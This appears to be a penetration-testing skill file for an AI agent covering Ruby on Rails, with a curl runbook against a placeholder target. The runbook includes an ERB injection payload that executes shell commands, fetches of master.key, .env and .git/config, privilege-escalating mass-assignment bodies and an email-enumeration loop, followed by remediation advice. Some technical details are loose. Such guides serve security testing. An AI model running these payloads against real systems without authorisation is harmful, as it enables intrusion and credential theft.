---
name: rails
description: Ruby on Rails — mass assignment, dynamic finders, ERB SSTI, Marshal session, Active Storage URL signing
triggers: [ruby on rails, rails, rake, devise, sidekiq, active record, active storage, master.key, erb, render inline]
---

# Ruby on Rails Security

Rails defaults are stronger than most frameworks, but the failure modes are distinctive: **mass assignment** when permit-list is missing, **strong-parameters bypass** via clever JSON shapes, **Marshal-backed session storage** when SECRET_KEY_BASE leaks, **ERB SSTI** via `render inline:`, **Active Storage signed-URL** abuse, and **dynamic finder** SQL injection on older versions.

## Attack Surface

### Mass assignment
- Rails 4+: strong parameters required (`params.require(:user).permit(:name, :email)`)
- Bug: `params.permit!` (the bang variant) = permit-all = mass-assignment open
- Bug: `User.create(params[:user])` (bypassing permit) — common in scaffold-generated code

### SECRET_KEY_BASE → session forging
- Rails uses `MessageEncryptor` (default) or `MessageVerifier` for session cookies
- Encrypted (default) — needs the key to read/write
- Cookie-stored session can use Marshal (Rails < 4.1 default) — read = JSON-shaped state visible to attacker
- Leaked SECRET_KEY_BASE → session forging → full impersonation

### ERB inline render
- `render inline: user_input` → ERB SSTI → RCE in Ruby (`<%= `id` %>`)
- `render text: user_input.html_safe` — XSS via html_safe disabling escape

### Dynamic finders
- Rails < 4.2: `User.find_by_name_and_email(name, email)` — `_and_` builds SQL
- User-controlled `find_by_` suffix could inject

### Active Storage signed URLs
- `rails_blob_url(blob)` generates a signed URL bound to a secret
- Bug: URLs leak in API responses; attacker captures, replays, downloads
- Some apps re-sign with different keys on dev vs prod — confirm the signing key

### Devise (authentication gem)
- Default lockable + recoverable + confirmable strategies
- Bug: `config.confirmation_keys = [:email]` + email-enumeration on signup
- Bug: Password reset token in URL not single-use; cached in browser history / referer

### Action Cable WebSocket
- `connect` callback identifies the user
- Bug: `find_verified_user` returns nil — connection rejected, but timing differs by user existence
- Bug: channel-level authz missing; subscribed clients receive all data

### Active Job + Sidekiq
- `Sidekiq::Web` UI mounted at `/sidekiq` by default
- Bug: mounted without auth → enqueue arbitrary jobs / see job arguments / kill jobs

## Detection Channels

### Fingerprint Rails
```bash
curl -sI 'https://<TARGET>/' | grep -iE 'server|x-runtime|x-powered-by'
# X-Runtime header = Rails
# X-Powered-By: Phusion Passenger = Rails app server

# 404 page: Rails default "/public/404.html"
curl -s 'https://<TARGET>/nonexistent' | grep -i 'rails'
```

### Default routes
```bash
curl -s 'https://<TARGET>/rails/info/properties'  # Rails 4.x debug info
curl -s 'https://<TARGET>/rails/info/routes'      # route list
curl -s 'https://<TARGET>/health_check'           # common pattern
curl -s 'https://<TARGET>/sidekiq'                # Sidekiq UI
curl -s 'https://<TARGET>/uploads'                # default ActiveStorage path
```

### Mass-assignment probe
```bash
# POST extra fields that should be restricted
curl -X POST 'https://<TARGET>/api/users' \
  -H 'Content-Type: application/json' \
  -d '{"name":"strix","admin":true,"role":"admin","email_verified":true}'

# Response includes admin:true → mass-assignment
```

### SECRET_KEY_BASE leak signals
```bash
# Common exposures
curl -s 'https://<TARGET>/.git/config'
curl -s 'https://<TARGET>/config/master.key'      # encrypted credentials key
curl -s 'https://<TARGET>/config/credentials.yml.enc'  # encrypted blob
curl -s 'https://<TARGET>/.env'
```

`master.key` is the symmetric key for `config/credentials.yml.enc` — leak it and the encrypted Rails secrets are readable.

### ERB inline injection
```bash
# Probe with Ruby-evaluable string
curl 'https://<TARGET>/render?template=<%= 7*7 %>'

# Response with "49" → ERB SSTI → RCE
```

## Operational Runbook

### Step 1 — fingerprint + version
```bash
# X-Runtime / X-Request-Id headers from Rails middleware
curl -sI 'https://<TARGET>/'

# Specific Rails version from a default route
curl -s 'https://<TARGET>/rails/info/properties' 2>/dev/null | grep -i version
```

### Step 2 — mass-assignment audit
```bash
# Discover write endpoints
for endpoint in /api/users /api/profiles /api/sessions; do
  echo "=== $endpoint ==="
  # Submit with extra fields that should NOT be permittable
  curl -i -X POST "https://<TARGET>${endpoint}" \
    -H 'Authorization: Bearer <TOKEN>' \
    -H 'Content-Type: application/json' \
    -d '{"name":"strix","admin":true,"role":"superadmin","permissions":["all"],"email_verified":true,"locked":false}'
done
```

### Step 3 — SECRET_KEY_BASE → session forge
```bash
# Once you have SECRET_KEY_BASE
# Rails 5+ default cookie name: _<app_name>_session
RAILS_COOKIE='abc123...'  # captured session cookie

# Decrypt + tamper:
python3 <<EOF
# Or use the rails-encrypted-cookie-decryptor open-source tool
# https://github.com/ChrisTruncer/RailsEncryptedCookieDecryptor
EOF
```

### Step 4 — ERB inline / template injection
```bash
# Any endpoint that renders user input as template
curl 'https://<TARGET>/admin/preview?template=<%=7*7%>'

# If 49 reflects, escalate per ssti.md (Ruby branch)
curl 'https://<TARGET>/admin/preview?template=<%=%60id%60%>'  # backtick = shell
```

### Step 5 — Active Storage signed-URL replay
```bash
# Capture a signed URL from app's JSON response
URL='https://<TARGET>/rails/active_storage/blobs/.../sensitive.pdf?...&signature=...'

# Re-fetch from a new IP / session
curl -o /tmp/leak.pdf "$URL"

# Confirm signature is replayable (no IP / time / single-use binding)
```

### Step 6 — Sidekiq Web UI
```bash
# Common mounts
curl -s 'https://<TARGET>/sidekiq' | grep -i 'Sidekiq'
curl -s 'https://<TARGET>/sidekiq/queues'

# Unauthenticated = critical (queue introspection + job manipulation)
```

### Step 7 — Devise enumeration
```bash
# Email enumeration via signup
for email in admin@target.com user1@target.com; do
  RESP=$(curl -s -i -X POST 'https://<TARGET>/users' \
    -d "user[email]=${email}&user[password]=Test123!" -o /tmp/resp)
  # Response differs based on whether email exists
  diff -q /tmp/resp /tmp/baseline_resp
done
```

## Specific Vulnerability Classes

### Active Record `where` string SQL
- `User.where("name = '#{params[:name]}'")` → SQLi
- Should be `User.where(name: params[:name])` (parameterised)

### `raise` in production exposing source
- `Rails.env.production?` default exception page shows `production.html`
- Bug: custom error handler that `raise`s in production = stack trace leak

### `params.permit!` bang variant
- `params.require(:user).permit!` permits EVERYTHING
- Subtle bug because it's only one character different from the safe form

### `User.find_or_create_by(params[:user])`
- Mass-assigns the `params[:user]` hash
- Combined with creating an admin: trivial elevation

### `link_to` with user-controlled URL
- `link_to "Click", user_input` — if `user_input` starts with `javascript:`, XSS via href
- `sanitize_url` filter helps but is opt-in

### `MessageVerifier` cookies + key rotation
- Rails supports key rotation via `Rails.application.key_generator`
- Bug: old keys retained beyond rotation; leaked old key still forges sessions

## Bypass Techniques

- **Strong-parameters via array**: `params.permit(:user => {})` permits empty hash; some attackers send `user: {"admin":"true", "extra":"x"}` — depending on permit form, extra fields may slip
- **`params[:user][:role]` direct access**: when controller does `User.new(params[:user][:role])` — bypasses permit
- **JSON vs nested params**: send JSON body `{"user":{"admin":true}}` vs form-encoded `user[admin]=true`; some validators handle them differently

## Validation

1. Mass assignment: extra field reflected in response.
2. SECRET_KEY_BASE: leaked + used to mint a forged session.
3. ERB SSTI: math probe evaluated server-side.
4. Sidekiq Web: anonymous access shows queue.
5. Devise enumeration: response time / content differs between known + unknown emails.

## False Positives

- `params.permit!` in dev / staging seed scripts — not a production finding.
- Extra fields in response are intentional (e.g., `admin:false` shown for completeness).
- Sidekiq mounted behind auth at the front proxy (Cloudflare Access etc.) — confirm before scoring.
- ERB tag in URL is reflected as text but not evaluated — would need source review.

## Impact

- Mass assignment → privilege escalation (set `admin:true` on signup).
- SECRET_KEY_BASE leak → impersonation of any user.
- ERB SSTI → RCE.
- Sidekiq Web → arbitrary job enqueue → background-execution pivot.
- Active Storage replay → data exfil of signed-URL-protected files.

## Remediation

1. **Strong parameters with explicit `.permit(:field1, :field2)`** — never `permit!`.
2. **`SECRET_KEY_BASE` from env-var** + Rails encrypted credentials (`config/credentials.yml.enc`).
3. **`render inline:` removed**; require `render template:` with file-based templates.
4. **Sidekiq Web behind authentication**: `Sidekiq::Web.use Rack::Auth::Basic` or routing constraint.
5. **`devise.confirmation_keys = [:email]` + generic responses**: never reveal whether email exists.
6. **Active Storage signed URLs with `expires_in`**: short TTL + IP-bound when sensitive.
7. **`config.force_ssl = true`**.

## Pro Tips

1. The single most-common Rails finding: `/sidekiq` mounted without auth in production.
2. Rails ≥ 5.2 encrypted credentials are the modern way; `master.key` is the file to never commit.
3. `X-Runtime` and `X-Request-Id` are strong Rails fingerprints — defenders rarely strip them.
4. `rails_admin` gem mounts `/admin` by default — often unauth-by-default in tutorials.
5. The `bcrypt` gem is Rails' default password hasher; downgrades to SHA / MD5 are rare but happen in legacy apps.

## Summary

Rails defaults are good. Failure modes are at the edges: strong-parameter bypass, secret-key leak, ERB inline render, Sidekiq exposure. Audit `permit` calls + `inline:` renders + mounted gems.
